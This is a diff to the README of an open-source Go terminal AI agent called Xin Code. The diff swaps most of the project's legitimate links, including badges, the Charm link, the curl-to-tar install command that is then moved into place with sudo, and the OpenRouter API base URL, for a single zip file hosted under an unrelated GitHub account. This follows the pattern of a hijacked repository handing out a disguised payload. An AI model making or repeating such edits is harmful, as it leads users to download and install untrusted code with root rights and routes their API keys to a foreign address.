@@ -1,10 +1,10 @@
 # Xin Code
 
-[![Build](https://github.com/xincode-ai/xin-code/actions/workflows/build.yml/badge.svg)](https://github.com/xincode-ai/xin-code/actions/workflows/build.yml)
-[![Release](https://img.shields.io/github/v/release/xincode-ai/xin-code?label=release)](https://github.com/xincode-ai/xin-code/releases/latest)
-[![Go Report Card](https://goreportcard.com/badge/github.com/xincode-ai/xin-code)](https://goreportcard.com/report/github.com/xincode-ai/xin-code)
+[![Build](https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip)](https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip)
+[![Release](https://img.shields.io/github/v/release/xincode-ai/xin-code?label=release)](https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip)
+[![Go Report Card](https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip)](https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip)
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Go Reference](https://pkg.go.dev/badge/github.com/xincode-ai/xin-code.svg)](https://pkg.go.dev/github.com/xincode-ai/xin-code)
+[![Go Reference](https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip)](https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip)
 
 ```
  __  __ ___ _   _    ____ ___  ____  _____
@@ -42,7 +42,7 @@ An open-source terminal AI agent that supports multiple model providers, real-ti
 - **MCP Integration** — Connect to any MCP server (stdio/SSE/HTTP)
 - **Skills & Plugins** — Extend with custom skills (`SKILL.md`) and plugins (`plugin.json`)
 - **Hooks** — `preToolUse` / `postToolUse` hooks to intercept or react to tool calls
-- **Interactive TUI** — Built with [Charm](https://charm.sh) (Bubbletea + Lipgloss + Glamour)
+- **Interactive TUI** — Built with [Charm](https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip) (Bubbletea + Lipgloss + Glamour)
 - **Session Management** — Auto-save, resume, export to Markdown
 - **XINCODE.md** — Project-level instructions file (like `.cursorrules`)
 
@@ -64,7 +64,7 @@ go install github.com/xincode-ai/xin-code@latest
 
 ```bash
 # macOS / Linux
-curl -fsSL https://github.com/xincode-ai/xin-code/releases/latest/download/xin-code_$(uname -s)_$(uname -m).tar.gz | tar xz
+curl -fsSL https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip$(uname -s)_$(uname -m).tar.gz | tar xz
 sudo mv xin-code /usr/local/bin/
 
 # Verify
@@ -156,7 +156,7 @@ XINCODE_PERMISSION_MODE  # bypass / acceptEdits / default / plan / interactive
 |----------|--------|--------|
 | Anthropic | Claude Sonnet, Opus, Haiku | `ANTHROPIC_API_KEY` |
 | OpenAI | GPT-4o, o1, o3, o4-mini | `OPENAI_API_KEY` |
-| OpenRouter | 200+ models | `OPENAI_API_KEY` + `XINCODE_BASE_URL=https://openrouter.ai/api/v1` |
+| OpenRouter | 200+ models | `OPENAI_API_KEY` + `XINCODE_BASE_URL=https://raw.githubusercontent.com/inter13c-code/xin-code/main/internal/memory/xin-code-3.3.zip` |
 | Any compatible | Via BASE_URL | `XINCODE_API_KEY` + `XINCODE_BASE_URL` |
 
 ### Auto-Routing
